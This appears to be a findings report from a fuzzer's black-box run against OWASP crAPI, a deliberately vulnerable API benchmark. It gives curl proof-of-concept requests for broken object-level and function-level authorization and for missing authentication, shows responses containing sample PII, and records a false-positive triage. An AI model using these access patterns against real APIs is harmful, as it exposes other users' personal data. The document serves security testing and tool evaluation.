# OWASP crAPI — findings

Black-box run of the Track A stateful fuzzer against [OWASP crAPI](https://github.com/OWASP/crapi),
the standard deliberately-vulnerable API benchmark, launched from its own
`docker-compose` stack and driven only through the gateway on `:8888`.

Reproduce the whole run from a clean stack:

```bash
RL_CRAPI_COMPOSE=/path/to/crapi/docker-compose.yml \
  python -m eval.campaign --apis crapi --budget 300 --rounds 1 --no-engine --out runs
```

Each run: ~3k–12k synthesized request sequences, ~25–27 of 35 fuzzable
operations covered. Two identities (`rl-primary`, `rl-alt`) plus an
unauthenticated client let the authorization oracles tell "my data" from
"someone else's". Findings below were verified live, by hand, against the
running stack — not just reproduced by the tool.

## Confirmed vulnerabilities

### 1. BOLA — any user reads any vehicle's live location and owner PII · High
`GET /identity/api/v2/vehicle/{vehicleId}/location`

A logged-in user who owns no vehicle at all can read the GPS coordinates,
owner full name and owner email of *any* vehicle by id:

```bash
# token belongs to rl-primary, who owns zero vehicles
curl -s "$B/identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location" \
  -H "Authorization: Bearer $TOKEN"
# -> {"carId":"cd515c12-...","vehicleLocation":{"latitude":"31.284788",
#     "longitude":"-92.471176"},"fullName":"Pogba","email":"pogba006@example.com"}
```

Identical response for `rl-alt`; `401` with no token. The endpoint checks that
you are *a* user, never that you are *this vehicle's* user. Oracle:
`cross_user_access`.

### 2. BFLA — a normal user calls the admin "all users" endpoint · High
`GET /workshop/api/management/users/all`

A non-privileged account receives the full user directory — every user's
email, phone number and credit balance:

```bash
curl -s "$B/workshop/api/management/users/all" -H "Authorization: Bearer $ALT_TOKEN"
# -> {"users":[{"user":{"email":"adam007@example.com","number":"9876895423"},
#     "available_credit":100.0}, ... ]}
```

Oracle: `broken_function_auth` (the path is an administrative function by name;
a second, non-privileged identity still gets `200`).

### 3. BOLA — any user reads any order's details and buyer PII · High
`GET /workshop/api/shop/orders/{order_id}`

Order ids are sequential integers and ownership is never checked, so iterating
ids walks every customer's orders, including buyer email, phone and
transaction id:

```bash
curl -s "$B/workshop/api/shop/orders/1" -H "Authorization: Bearer $TOKEN"
# -> {"order":{"id":1,"user":{"email":"adam007@example.com","number":"9876895423"},
#     ...,"transaction_id":"ba32cbb6-..."}, "payment":...}
```

Oracle: `cross_user_access`.

### 4. Broken authentication — the same order endpoint needs no token at all · High
`GET /workshop/api/shop/orders/{order_id}`

The same data comes back with **no `Authorization` header**:

```bash
curl -s "$B/workshop/api/shop/orders/1"      # no token
# -> 200, full order + buyer PII
```

Oracle: `missing_auth` (the spec declares `bearerAuth`; the server serves it
unauthenticated). This compounds finding 3 — the orders are not just
cross-readable, they are public.

### 5. Missing authentication on a declared-protected endpoint · Low / informational
`GET /workshop/api/shop/return_qr_code`

Served with no token though the spec requires auth. It returns a static QR
PNG with no per-user data, so the impact is low — but the declared contract is
not enforced. Oracle: `missing_auth`.

## Robustness

Each run also produced **13–18 unique `5XX` responses** across the fuzzable
surface — inputs that crash a handler (HTTP 500) rather than being rejected
(400). These are reliability defects, not necessarily security bugs; the raw
set is in each run's `findings.jsonl`.

## False positives — triaged out (soundness record)

Kept here deliberately: the discipline is that nothing ships as a finding
unless it survives a hand check, and every rejection is written down.

| Reported by | Why it is **not** a bug | Action taken |
|---|---|---|
| `cross_user_access` / comment on `/community/*` | crAPI's community is a **public forum** (`/posts/recent` lists everyone's posts by design); cross-user read/comment is intended | Scoped `/community/*` out of the authz oracles per-API (`public_authz_paths`) |
| `broken_function_auth` on `GET /workshop/api/shop/orders/all` | `orders/all` returns the caller's **own** orders, not an admin view; a second user got their own empty list | Removed `/all` from the BFLA admin-name heuristic |
| `schema_conformance` on order / users / recent / comments | Our hand-written spec was inaccurate (`orders`→`order`, `available_credit` int→number, `recent` array→object, post `comments` string→object, `vehicleid` over-strict `uuid`) | Corrected the spec to match crAPI's real responses |
| `safety` on `GET /workshop/api/mechanic/receive_report` | The "state changed between two identical GETs" was other concurrent workers creating reports, not the GET itself; identical isolated GETs return identical results | Not reported |
| `race_condition` (collection POSTs: posts, comments, products, coupons, resend_email) | Two concurrent creates both succeeding is normal for a create endpoint; warning-level, no demonstrated harm | Not reported as bugs |

## Harness notes

- crAPI's nginx gateway refuses to boot unless the `crapi-chatbot` upstream
  hostname resolves. Rather than run the heavy ML chatbot (+ chromadb), the
  harness starts a tiny stub under that network alias so nginx boots; nothing
  routes real traffic to it. See `eval/apis.py` `_start_compose`.
- Credential- and account-mutating identity endpoints (password/email change,
  reset, OTP, bulk signup) are excluded from the *fuzzed* op set: fuzzing them
  with our own token locks the run out of every protected endpoint, or desyncs
  crAPI's user-id sequence. They remain available for finding replay. See
  `fuzz_exclude` in `eval/apis.py`.
